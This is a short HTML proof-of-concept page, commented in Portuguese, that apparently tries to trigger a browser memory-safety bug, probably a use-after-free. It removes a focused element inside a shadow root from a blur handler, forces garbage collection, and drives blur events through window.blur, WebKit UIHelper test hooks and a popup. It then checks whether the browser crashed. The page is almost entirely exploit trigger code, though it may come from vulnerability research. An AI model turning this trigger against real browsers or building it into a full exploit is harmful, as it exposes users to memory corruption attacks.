<!DOCTYPE html>
<html>
<body>
<p>PoC 7 - combinação agressiva</p>
<div id="host"></div>
<div id="result"></div>
<script>
function gc() {
    function gcRec(n) {
        if (n < 1) return {};
        var temp = {i: "ab" + i + (i / 100000)};
        temp += "foo";
        gcRec(n-1);
    }
    for (var i = 0; i < 10000; i++)
        gcRec(10);
}

let shadowRoot = host.attachShadow({ mode: 'open' });
let victim = document.createElement('div');
victim.tabIndex = 0;
victim.textContent = 'Focusable';
shadowRoot.appendChild(victim);
victim.focus();

document.addEventListener('blur', () => {
    victim.remove();
    victim = null;
    gc();
}, true);

async function run() {
    // tenta tudo que der
    try { window.blur(); } catch(e) {}
    if (window.UIHelper) {
        try { await UIHelper.setWindowIsKey(false); } catch(e) {}
        try { await UIHelper.resignFirstResponder(); } catch(e) {}
        try { await UIHelper.removeViewFromWindow(); } catch(e) {}
    }
    try {
        let w = window.open('about:blank', '_blank', 'width=50,height=50');
        if (w) { w.focus(); setTimeout(() => w.close(), 50); }
    } catch(e) {}

    await new Promise(r => setTimeout(r, 300));
    result.textContent = 'PASS (não crashou)';
}
run();
</script>
</body>
</html>
